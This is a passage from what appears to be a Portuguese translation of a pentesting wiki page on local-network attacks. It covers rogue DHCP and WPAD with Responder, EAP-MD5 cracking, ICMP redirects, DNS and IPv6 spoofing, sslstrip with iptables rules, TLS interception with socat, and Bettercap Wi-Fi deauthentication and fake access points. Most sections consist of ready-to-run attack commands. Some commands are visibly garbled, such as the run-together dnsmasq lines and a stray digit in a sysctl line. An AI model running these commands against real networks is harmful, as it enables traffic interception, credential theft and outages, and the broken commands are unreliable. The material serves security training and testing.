Você pode usar os ataques DoS mencionados para forçar os clientes a obter novos leases dentro do ambiente e esgotar os servidores legítimos para que eles fiquem inoperantes. Então, quando os legítimos tentarem se reconectar, **você pode servir valores maliciosos mencionados no próximo ataque**.

#### Definir valores maliciosos

Você pode usar o script DHCP do Responder (_/usr/share/responder/DHCP.py_) para estabelecer um servidor DHCP falso. Definir um gateway malicioso não é ideal, porque a conexão sequestrada é apenas meio-duplex (ou seja, capturamos pacotes de saída do cliente, mas não as respostas do gateway legítimo). Como tal, eu recomendaria definir um servidor DNS ou WPAD falso para capturar tráfego HTTP e credenciais em particular.

| Descrição                                   | Exemplo                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Nosso endereço IP, anunciado como um gateway | _-i 10.0.0.100_                                                              |
| O nome de domínio DNS local (opcional)       | _-d example.org_                                                             |
| Endereço IP do roteador/gateway original     | _-r 10.0.0.1_                                                                |
| Endereço IP do servidor DNS primário         | _-p 10.0.0.100_                                                              |
| Endereço IP do servidor DNS secundário (opcional) | _-s 10.0.0.1_                                                             |
| A máscara de rede da rede local              | _-n 255.255.255.0_                                                           |
| A interface para ouvir o tráfego DHCP        | _-I eth1_                                                                    |
| Endereço de configuração WPAD (URL)          | _-w “_[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Falsificar o endereço IP do gateway padrão   | -S                                                                           |
| Responder a todas as solicitações DHCP (muito ruidoso) | -R                                                                           |

### **Ataques EAP**

Aqui estão algumas táticas de ataque que podem ser usadas contra implementações 802.1X:

* Força bruta ativa de senhas via EAP
* Atacando o servidor RADIUS com conteúdo EAP malformado _\*\*_(exploits)
* Captura de mensagens EAP e quebra offline de senhas (EAP-MD5 e PEAP)
* Forçando autenticação EAP-MD5 para ignorar a validação do certificado TLS
* Injetando tráfego de rede malicioso ao autenticar usando um hub ou similar

Se o atacante estiver entre a vítima e o servidor de autenticação, ele poderia tentar degradar (se necessário) o protocolo de autenticação para EAP-MD5 e capturar a tentativa de autenticação. Em seguida, ele poderia fazer força bruta nisso usando:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### Ataques FHRP (GLBP & HSRP) <a href="#6196" id="6196"></a>

**FHRP** (Protocolo de Redundância do Primeiro Salto) é uma classe de protocolos de rede projetados para **criar um sistema de roteamento redundante e quente**. Com o FHRP, roteadores físicos podem ser combinados em um único dispositivo lógico, o que aumenta a tolerância a falhas e ajuda a distribuir a carga.

**Os engenheiros da Cisco Systems desenvolveram dois protocolos FHRP, GLBP e HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Existem três versões do Protocolo de Informações de Roteamento (RIP) - RIP, RIPv2 e RIPng. RIP e RIPv2 usam datagramas UDP enviados para pares via porta 520, enquanto o RIPng transmite datagramas para a porta UDP 521 via multicast IPv6. O RIPv2 introduziu suporte de autenticação MD5. O RIPng não incorpora autenticação nativa; em vez disso, depende de cabeçalhos IPsec AH e ESP opcionais dentro do IPv6.

Para obter mais informações sobre como atacar este protocolo, consulte o livro _**Network Security Assessment: Know Your Network (3ª edição).**_

### Ataques EIGRP

**EIGRP (Protocolo de Roteamento de Gateway Interior Aprimorado)** é um protocolo de roteamento dinâmico. **É um protocolo de vetor de distância.** Se não houver **autenticação** e configuração de interfaces passivas, um **intruso** pode interferir no roteamento EIGRP e causar **envenenamento de tabelas de roteamento**. Além disso, a rede EIGRP (em outras palavras, sistema autônomo) **é plana e não tem segmentação em nenhuma zona**. Se um **atacante injetar uma rota**, é provável que esta rota se **espalhe** por todo o sistema autônomo EIGRP.

Para atacar um sistema EIGRP, é necessário **estabelecer uma vizinhança com um roteador EIGRP legítimo**, o que abre muitas possibilidades, desde reconhecimento básico até várias injeções.

\*\*\*\*[**FRRouting**](https://frrouting.org/) permite que você implemente **um roteador virtual que suporta BGP, OSPF, EIGRP, RIP e outros protocolos.** Tudo o que você precisa fazer é implantá-lo no sistema do seu atacante e você pode realmente fingir ser um roteador legítimo no domínio de roteamento.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) também suporta a captura de transmissões EIGRP e a injeção de pacotes para manipular a configuração de roteamento. Para obter mais informações sobre como atacá-lo com Coly, consulte o livro _**Network Security Assessment: Know Your Network (3ª edição).**_

### OSPF

A maioria das implementações do Open Shortest Path First (OSPF) usa MD5 para fornecer autenticação entre roteadores. Loki e John the Ripper podem capturar e atacar hashes MD5 para revelar a chave, que pode então ser usada para anunciar novas rotas. Os parâmetros de rota são definidos usando a guia _Injection_, e a chave é definida em _Connection_.

Para obter mais informações sobre como atacar este protocolo, consulte o livro _**Network Security Assessment: Know Your Network (3ª edição).**_

### Outras Ferramentas e Fontes Genéricas

* [**Above**](https://github.com/c4s73r/Above): Ferramenta para escanear o tráfego de rede e encontrar vulnerabilidades
* Você pode encontrar mais informações sobre ataques de rede [aqui](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO: Leia tudo e todos os novos ataques, se houver)_

## **Spoofing**

O atacante configura todos os parâmetros de rede (GW, IP, DNS) do novo membro da rede enviando respostas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Verifique a [seção anterior](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste em enviar um pacote ICMP tipo 1 código 5 que indica que o atacante é a melhor maneira de alcançar um IP. Então, quando a vítima quer entrar em contato com o IP, ela enviará o pacote através do atacante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

O atacante irá resolver alguns (ou todos) os domínios que a vítima solicita.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar DNS próprio com dnsmasq**

O `dnsmasq` é um servidor DNS leve e fácil de configurar que pode ser usado para configurar um DNS local para testes de penetração. Ele pode ser usado para redirecionar solicitações de DNS para um endereço IP específico, o que pode ser útil para testar ataques de phishing ou para redirecionar o tráfego para um servidor controlado pelo testador. Para configurar o `dnsmasq`, basta editar o arquivo de configuração `/etc/dnsmasq.conf` e adicionar as entradas de DNS desejadas.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Gateways Locais

Múltiplas rotas para sistemas e redes frequentemente existem. Ao construir uma lista de endereços MAC dentro da rede local, use o _gateway-finder.py_ para identificar hosts que suportam o encaminhamento IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/) 
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Falsificação de LLMNR, NBT-NS e mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Os sistemas Microsoft usam o Link-Local Multicast Name Resolution (LLMNR) e o NetBIOS Name Service (NBT-NS) para resolução de host local quando as pesquisas DNS falham. As implementações zero-configuration do Apple Bonjour e do Linux usam o Multicast DNS (mDNS) para descobrir sistemas dentro de uma rede. Esses protocolos são não autenticados e transmitem mensagens por UDP; portanto, os atacantes podem explorá-los para direcionar os usuários para serviços maliciosos.

Você pode se passar por serviços que são procurados por hosts usando o Responder para enviar respostas falsas.\
Leia aqui mais informações sobre [como se passar por serviços com o Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsificação de WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Muitos navegadores usam o Web Proxy Auto-Discovery (WPAD) para carregar configurações de proxy da rede. Um servidor WPAD fornece configurações de proxy do cliente por meio de uma URL específica (por exemplo, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) ao ser identificado por meio de qualquer um dos seguintes:

* DHCP, usando uma entrada de código 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, procurando pelo nome do host _wpad_ no domínio local
* Microsoft LLMNR e NBT-NS (no caso de falha na pesquisa DNS)

O Responder automatiza o ataque WPAD - executando um proxy e direcionando clientes para um servidor WPAD malicioso via DHCP, DNS, LLMNR e NBT-NS.\
Leia aqui mais informações sobre [como se passar por serviços com o Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsificação de dispositivos SSDP e UPnP](spoofing-ssdp-and-upnp-devices.md)

Você pode oferecer diferentes serviços na rede para tentar **enganar um usuário** a inserir algumas **credenciais em texto simples**. **Mais informações sobre esse ataque em** [**Falsificação de dispositivos SSDP e UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Falsificação de vizinho IPv6

Este ataque é muito semelhante ao ARP Spoofing, mas no mundo IPv6. Você pode fazer a vítima pensar que o IPv6 do GW tem o MAC do atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding de Anúncio de Roteador IPv6

Alguns sistemas operacionais configuram por padrão o gateway a partir dos pacotes RA enviados na rede. Para declarar o atacante como roteador IPv6, você pode usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing de DHCP IPv6

Por padrão, alguns sistemas operacionais tentam configurar o DNS lendo um pacote DHCPv6 na rede. Então, um atacante poderia enviar um pacote DHCPv6 para se configurar como DNS. O DHCP também fornece um endereço IPv6 para a vítima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (página falsa e injeção de código JS)

## Ataques na Internet

### sslStrip

Basicamente, o que esse ataque faz é, caso o **usuário** tente **acessar** uma página **HTTP** que está **redirecionando** para a versão **HTTPS**, o **sslStrip** irá **manter** uma **conexão HTTP com** o **cliente e** uma **conexão HTTPS com** o **servidor**, permitindo que ele **monitore** a conexão em **texto simples**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mais informações [aqui](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ e dns2proxy para burlar HSTS

A **diferença** entre **sslStrip+ e dns2proxy** em relação ao **sslStrip** é que eles irão **redirecionar** por exemplo _**www.facebook.com**_ **para** _**wwww.facebook.com**_ (note o **extra** "**w**") e irão definir o **endereço deste domínio como o IP do atacante**. Dessa forma, o **cliente** irá **conectar-se** a _**wwww.facebook.com**_ **(o atacante)**, mas nos bastidores o **sslstrip+** irá **manter** a **conexão real** via https com **www.facebook.com**.

O **objetivo** dessa técnica é **evitar o HSTS** porque _**wwww**.facebook.com_ **não será** salvo no **cache** do navegador, então o navegador será enganado para realizar **autenticação do Facebook em HTTP**.\
Observe que, para realizar esse ataque, a vítima deve tentar acessar inicialmente [http://www.faceook.com](http://www.faceook.com) e não https. Isso pode ser feito modificando os links dentro de uma página http.

Mais informações [aqui](https://www.bettercap.org/legacy/#hsts-bypass), [aqui](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) e [aqui](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ não funcionam mais. Isso ocorre porque existem regras HSTS pré-salvas nos navegadores, então mesmo que seja a primeira vez que um usuário acesse um domínio "importante", ele o acessará via HTTPS. Além disso, observe que as regras pré-salvas e outras regras geradas podem usar a flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **então o exemplo _**wwww.facebook.com**_ de antes não funcionará mais, já que o** _**facebook.com**_ **usa HSTS com `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen na porta
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL escutando na porta

#### Gerar chaves e certificado autoassinado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Escutando usando certificado
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Escutando usando certificado e redirecionando para os hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Às vezes, se o cliente verifica se o CA é válido, você pode **servir um certificado de outro nome de host assinado por um CA**.\
Outro teste interessante é servir um **certificado do nome de host solicitado, mas autoassinado**.

Outras coisas para testar são tentar assinar o certificado com um certificado válido que não seja um CA válido. Ou usar a chave pública válida, forçar o uso de um algoritmo como o diffie hellman (um que não precise descriptografar nada com a chave privada real) e quando o cliente solicitar uma sonda da chave privada real (como um hash), enviar uma sonda falsa e esperar que o cliente não verifique isso.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events 
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notas de Descoberta Ativa

Tenha em mente que quando um pacote UDP é enviado para um dispositivo que não possui a porta solicitada, um ICMP (Port Unreachable) é enviado.

### **Descoberta ARP**

Pacotes ARP são usados para descobrir quais IPs estão sendo usados dentro da rede. O PC tem que enviar uma solicitação para cada endereço IP possível e apenas aqueles que estão sendo usados responderão.

### **mDNS (multicast DNS)**

Bettercap envia uma solicitação MDNS (a cada X ms) perguntando por **\_services\_.dns-sd.\_udp.local** a máquina que vê este pacote geralmente responde a esta solicitação. Em seguida, ele procura apenas por máquinas que respondem a "serviços".

**Ferramentas**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap transmite pacotes para a porta 137/UDP perguntando pelo nome "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap transmite pacotes SSDP procurando por todos os tipos de serviços (Porta UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap transmite pacotes WSD procurando por serviços (Porta UDP 3702).

## Referências

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Dica de bug bounty**: **inscreva-se** na **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
